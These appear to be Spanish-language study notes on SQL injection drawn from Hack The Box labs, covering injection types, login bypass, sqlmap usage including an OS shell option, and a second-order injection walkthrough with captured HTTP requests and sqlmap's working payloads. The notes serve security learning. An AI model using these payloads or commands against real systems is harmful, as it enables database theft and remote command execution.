# SQL Injection

## SQL Injection Fundamentals
- Una inyección SQL es una vulnerabilidad de seguridad que permite a un atacante interferir con las consultas que una aplicación web realiza a su base de datos SQL.
- La inyección SQL se produce cuando se insertan datos no validados en una consulta SQL.
- La inyección SQL puede ser utilizada para leer, modificar y eliminar datos de una base de datos.
- La inyección SQL puede ser utilizada para ejecutar comandos en el sistema operativo.
- Hay diferentes tipos de inyecciones SQL, como la inyección SQL basada en errores, la inyección SQL basada en tiempo y la inyección SQL ciega.
![](https://academy.hackthebox.com/storage/modules/33/types_of_sqli.jpg)
    - union based SQL injection
        - ejemplo de payload: `1' UNION SELECT 1,2,3 --`
    - error based SQL injection
        - ejemplo de payload: `1' AND 1=CONVERT(int, (SELECT @@version)) --`
    - time based SQL injection
        - ejemplo de payload: `1' AND IF(1=1, SLEEP(5), 0) --`
    - blind SQL injection
        - ejemplo de payload: `1' AND SLEEP(5) --`

### Deteccion de SQL Injection
- Generalmente al poner un `'` en un campo de texto y si la aplicación devuelve un error de SQL, es probable que sea vulnerable a SQL Injection.
- También se puede poner un comentario `--` como intento de primer payload.
- Otra forma de detectar SQL Injection es mediante la inyección de comandos SQL en los campos de texto y observar si la aplicación devuelve resultados inesperados.
    - **"Error: near line 1: near "'": syntax error"** es un mensaje de error común que se obtiene cuando se inyecta un `'` en un campo de texto.
    - Ejemplo: `1' OR '1'='1`
    - [Otros ejemplos](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt?source=post_page-----7e777892e485---------------------------------------)

### Login Bypass SQL Injection
- La inyección SQL se puede utilizar para eludir la autenticación de un sistema.
- Ejemplo de payload: `admin' OR '1'='1`
    - Si el usuario y la contraseña son correctos, la consulta SQL se verá así: `SELECT * FROM users WHERE username='admin' AND password='password'`
    - Esto genera una tautología que siempre es verdadera, entonces la va a tomar como verdadera y va a permitir el acceso.
![](https://academy.hackthebox.com/storage/modules/33/or_inject_diagram.png)


## [SQLI manual](./manualSQLI.md)

## SQLMAP
- SQLMAP es una herramienta de prueba de penetración de código abierto que automatiza el proceso de detección y explotación de vulnerabilidades de inyección SQL.

### Comandos generales
- `sqlmap -u URL --dbs` para listar las bases de datos.
- `sqlmap -r HTTP-REQUEST-FILE --dbs` para usar un archivo con la request.
- `sqlmap -r HTTP-REQUEST-FILE --dbs --batch` para usar un archivo con la request y no hacer preguntas.
- `sqlmap -r HTTP-REQUEST-FILE --dbs --batch --level=5 --risk=3` para usar un archivo con la request y no hacer preguntas, con nivel de riesgo y nivel de profundidad.
- `sqlmap -r HTTP-REQUEST-FILE --dbs --batch --level=5 --risk=3  --current-user --current-db --is-dba` para usar un archivo con la request y no hacer preguntas, con nivel de riesgo y nivel de profundidad, y obtener información del usuario actual, base de datos actual y si es DBA.

#### Anti-CSRF Token
- Si la aplicación web utiliza tokens CSRF, se puede usar el parámetro `--csrf-token` para especificar el token CSRF.
- Ejemplo: `sqlmap -u URL --csrf-token=CSRF-TOKEN --dbs`
- `sqlmap -u URL --randomize=rp --dbs` para randomizar el token CSRF.
- `sqlmap -u URL --eval="import time; time.sleep(10)" --csrf-token=CSRF-TOKEN --dbs` para evaluar un script de python y dormir el tiempo que se le pase como argumento.

#### OS shell
- `sqlmap -u URL --os-shell` para obtener una shell en el sistema operativo.


## SQLI en WebSockets
- Dentro de los websockets se pueden realizar consultas SQL.
- Hay que estar atento al burp proxy para ver las peticiones y respuestas.
- sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "*"}' --dbs --threads 10 --level 5 --risk 3 --batch

## Inyección SQL de Segundo Orden

La inyección SQL de segundo orden ocurre cuando los datos inyectados no se utilizan de inmediato, sino que se almacenan en la base de datos y se procesan posteriormente en una consulta SQL de manera insegura.

### Ejemplo:
1. El atacante introduce datos maliciosos en un formulario que se almacenan en la base de datos.
2. Más tarde, otra funcionalidad de la aplicación utiliza esos datos almacenados en una consulta SQL sin validarlos, permitiendo la explotación.

- Este tipo de inyección es más difícil de detectar, ya que el impacto no es inmediato y depende de cómo la aplicación maneje los datos almacenados.

- `sqlmap -r update_genres.req --second-req=user-feed.req  --dbs --level 5 --risk 3 --batch --tamper=space2comment --random-agent`
- Siendo update_genres.req un archivo que contiene una petición HTTP POST de una api que actualiza algo, o sea que es muy probable que haga una consulta del tipo `UPDATE table SET column = value WHERE condition`.
    - Y la segunda petición que practicamente hace GET user feed, o sea que recarga/fetchea/actualiza la información en la aplicación.


### update_genres.req
```http	
POST /api/v1/gallery/user/genres HTTP/1.1
Host: 10.10.11.220
Content-Length: 17
X-XSRF-TOKEN: eyJpdiI6ImdtZ0VkQXI0aUZtTUVVNzZxUnF6VlE9PSIsInZhbHVlIjoiYmZTRGVOWmptTVN3S2NldGlZNWtxdkozYUF0N25HWXVuazRuL0hBTGo0QnRaSCsrVWhMNkNuV1ltaUhvbkxDbFlTaVJueFcvdVhvamFLbE9wREgxZkEvdjA0L0J0bWxvSWNma2VUZ3JyWXYraG1Vb1VZeVVqNXV0bDBtUStib0ciLCJtYWMiOiJjNWU2ZDkwYWM1MGQ3NDQ4MjE2ZTZhYmU0ZjRkNzU5NDhjZTNhODEzNzA1ZDlmY2UwOWNjNDM1OGYwYzdkMTdiIiwidGFnIjoiIn0=
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Origin: http://10.10.11.220
Referer: http://10.10.11.220/gallery
Accept-Encoding: gzip, deflate, br
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzQ0MDQ3MzcwLCJleHAiOjE3NDQwNjg5NzAsIm5iZiI6MTc0NDA0NzM3MCwianRpIjoiNDB3T0RMR2l1Qkp1aFczTyIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.N18GEbvP-Lpdcm-w0VsyqQ-Ihbyu5KYNq9obdXn65Aw; XSRF-TOKEN=eyJpdiI6ImdtZ0VkQXI0aUZtTUVVNzZxUnF6VlE9PSIsInZhbHVlIjoiYmZTRGVOWmptTVN3S2NldGlZNWtxdkozYUF0N25HWXVuazRuL0hBTGo0QnRaSCsrVWhMNkNuV1ltaUhvbkxDbFlTaVJueFcvdVhvamFLbE9wREgxZkEvdjA0L0J0bWxvSWNma2VUZ3JyWXYraG1Vb1VZeVVqNXV0bDBtUStib0ciLCJtYWMiOiJjNWU2ZDkwYWM1MGQ3NDQ4MjE2ZTZhYmU0ZjRkNzU5NDhjZTNhODEzNzA1ZDlmY2UwOWNjNDM1OGYwYzdkMTdiIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IlJXOWRQK0tJbk1jaUhCZDRLYktQV2c9PSIsInZhbHVlIjoiYWh4TGJYb1BjcnhMN2VVMWp2YzJiSkJoc0lRbjEzRVgxalc3Sm9aUUoyVktwaG9vZUdyWmpqYTZVTjc1bUQ2VFExUDd0UTVXTVdRMkxTaExsNGdVR0kvUTMxNzNwQlloS25yczJvUHlFelFobVQ2YWo1ZzVOQUdxRE9HM28xdTciLCJtYWMiOiJiN2U3MmNlOWI3ODYzNDE0ZTNhNDlkMDBiNmUzYTcyN2EwZGM1NTA2Yjc0MDMzOWU4NDkyODg2Zjc5N2YwNTUyIiwidGFnIjoiIn0%3D
Connection: keep-alive

{"genres":"test"}
``` 

### user-feed.req
```http
GET /api/v1/gallery/user/feed HTTP/1.1
Host: 10.10.11.220
X-XSRF-TOKEN: eyJpdiI6Im9JNktoUVE1cjA0NWpVMWlMcVdkbkE9PSIsInZhbHVlIjoiandkUFV2YTJIbTYwRjBiR0UyWG9HOUkxa1VtcDNJNGx4TWJDbU1FRnVURERWdThtdkR3TzJ4eXdENVNzcnNJcFpZanpWeFBPbzd1bUxHcVJzd0V4UmNsR0FDd29UbVNKVDcvUmtJN3BoVnBORnRxcHljTmJGTFdKbFFSOHF6MTciLCJtYWMiOiIwMGFhODg1NjcwZmExZDllMjNkYWQ2MzYwM2I2YjBkMjk4ZmNiZDBiZDZhOWMyOGE0NTMxOTViYjA3Y2UwNTVkIiwidGFnIjoiIn0=
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Referer: http://10.10.11.220/gallery
Accept-Encoding: gzip, deflate, br
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92MS9hdXRoL2xvZ2luIiwiaWF0IjoxNzQ0MDQ3MzcwLCJleHAiOjE3NDQwNjg5NzAsIm5iZiI6MTc0NDA0NzM3MCwianRpIjoiNDB3T0RMR2l1Qkp1aFczTyIsInN1YiI6IjI4IiwicHJ2IjoiMjNiZDVjODk0OWY2MDBhZGIzOWU3MDFjNDAwODcyZGI3YTU5NzZmNyJ9.N18GEbvP-Lpdcm-w0VsyqQ-Ihbyu5KYNq9obdXn65Aw; XSRF-TOKEN=eyJpdiI6Im9JNktoUVE1cjA0NWpVMWlMcVdkbkE9PSIsInZhbHVlIjoiandkUFV2YTJIbTYwRjBiR0UyWG9HOUkxa1VtcDNJNGx4TWJDbU1FRnVURERWdThtdkR3TzJ4eXdENVNzcnNJcFpZanpWeFBPbzd1bUxHcVJzd0V4UmNsR0FDd29UbVNKVDcvUmtJN3BoVnBORnRxcHljTmJGTFdKbFFSOHF6MTciLCJtYWMiOiIwMGFhODg1NjcwZmExZDllMjNkYWQ2MzYwM2I2YjBkMjk4ZmNiZDBiZDZhOWMyOGE0NTMxOTViYjA3Y2UwNTVkIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6IjBlMDYybXlIRklhZHdVU0UrdGtFNEE9PSIsInZhbHVlIjoibEc5VU9FNDhISDdzUXdpYTJlcVBLK0xrbVhkeEVScndZVGcvRTl6Rm1iOVE3REV5bys2djdXWEQ4K0treVRWMEFzZkoxSGNmTTFwRzVraU1VYzBzRUpEcDM2WkxFT2xpUnFNVUFrVFQ2YktuT3hUQ3pkUkhSZCtWbDNvOXlCVi8iLCJtYWMiOiJkY2E0YmFmMWExZDdiZTcxNjUyZDUyZDE2MWMyZjk4OGUzZjM3NjZkNGY0ZWI2YmIwMTIzOTJmYzc4ODFmNjZiIiwidGFnIjoiIn0%3D
Connection: keep-alive
```

### Payloads
``` 
---
Parameter: JSON genres ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: {"genres":"test') OR NOT 5455=5455 AND ('QYvP'='QYvP"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: {"genres":"test') AND (SELECT 5404 FROM (SELECT(SLEEP(5)))LAtK) AND ('ClJK'='ClJK"}

    Type: UNION query
    Title: MySQL UNION query (NULL) - 5 columns
    Payload: {"genres":"test') UNION ALL SELECT NULL,CONCAT(0x7162787071,0x4a4268414d737150586b687553784e4d757851796e6c724c68666a646d4c4c706e78736c51435370,0x7171627671),NULL,NULL,NULL#"}
---
```

- Entonces el comportamiento de la aplicación es el siguiente:
    - Actualizas los géneros de un usuario, y luego haces un GET a la api de user feed.
    - La aplicación hace un SELECT a la base de datos para obtener los géneros del usuario y mostrarlos en la aplicación.
- La inyección SQL de segundo orden se produce cuando la aplicación almacena los datos inyectados en la base de datos y luego los utiliza en una consulta SQL sin validarlos.
- petición POST => Guardas una inyección SQL en la base de datos.
- petición GET => La aplicación hace un SELECT a la base de datos y muestra los datos inyectados en la aplicación.
- La inyección SQL de segundo orden se produce cuando la aplicación almacena los datos inyectados en la base de datos y luego los utiliza en una consulta SQL sin validarlos.